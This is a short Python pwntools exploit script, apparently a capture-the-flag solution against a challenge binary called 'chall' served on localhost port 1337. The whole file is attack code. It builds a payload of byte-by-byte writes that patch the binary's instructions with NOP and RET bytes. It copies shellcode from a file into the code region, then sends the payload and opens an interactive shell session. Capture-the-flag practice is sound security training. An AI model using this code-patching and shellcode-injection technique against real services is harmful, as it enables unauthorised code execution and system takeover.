from pwn import *

elf = ELF("../build_out/chall")

payload = b""

def write(what, where):
    global payload
    payload += p8(what)
    payload += p8(where - elf.symbols.chall)

write(0x90, 0x40118e)
write(0x00, 0x401177)

shellcode = read("shellcode.bin")
for i in range(len(shellcode)):
    write(shellcode[i], 0x4011f3 + i)

write(0xc3, 0x40118e)

p = process("nc localhost 1337", shell=True)
p.send(payload)
p.interactive()
